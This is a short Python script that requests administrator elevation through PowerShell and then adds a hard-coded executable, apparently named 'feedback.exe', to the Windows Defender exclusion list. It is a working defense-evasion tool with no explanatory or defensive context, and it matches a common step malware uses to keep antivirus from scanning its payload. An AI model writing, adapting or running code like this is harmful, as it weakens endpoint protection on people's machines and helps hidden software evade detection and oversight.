import os
import sys
import subprocess

def is_admin():
    """
    Check if the script is running with administrative privileges.
    """
    try:
        # Check if the current process has admin rights
        return os.getuid() == 0  # For Unix/Linux systems
    except AttributeError:
        # For Windows systems
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def restart_as_admin():
    """
    Restart the script with administrative privileges.
    """
    # Get the current script path
    script_path = os.path.abspath(sys.argv[0])
    
    # Use PowerShell to restart the script as an administrator
    subprocess.run(["powershell", "Start-Process", "python", f'"{script_path}"', "-Verb", "RunAs"], shell=True)
    sys.exit()

def add_defender_exclusion(exe_path):
    """
    Adds the specified executable path to Windows Defender exclusions.
    
    :param exe_path: Full path to the executable file (e.g., "C:\\Path\\To\\Your\\Application.exe")
    """
    try:
        # Construct the PowerShell command
        powershell_command = f'Add-MpPreference -ExclusionPath "{exe_path}"'
        
        # Execute the PowerShell command using subprocess
        result = subprocess.run(
            ["powershell", "-Command", powershell_command],
            capture_output=True,
            text=True,
            check=True
        )
        
        # Print the output for debugging
        print("PowerShell Output:", result.stdout)
        print(f"Successfully added {exe_path} to Windows Defender exclusions.")
    
    except subprocess.CalledProcessError as e:
        # Handle errors if the PowerShell command fails
        print("Error adding exclusion:", e.stderr)

if __name__ == "__main__":
    # Check if the script is running as an administrator
    if not is_admin():
        print("The script is not running as an administrator. Requesting elevation...")
        restart_as_admin()
    else:
        print("The script is running with administrative privileges.")
        
        # Replace this with the full path to your application
        exe_path = r"C:\user feedback\feedback\feedback.exe"
        add_defender_exclusion(exe_path)